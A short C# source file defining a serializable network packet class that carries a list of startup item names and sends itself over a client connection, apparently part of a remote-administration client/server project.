using System.Collections.Generic;
using System;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ClientPackets
{
    [Serializable]
    public class GetStartupItemsResponse : IPacket
    {
        public List<string> StartupItems { get; set; }

        public GetStartupItemsResponse()
        {
        }

        public GetStartupItemsResponse(List<string> startupitems)
        {
            this.StartupItems = startupitems;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}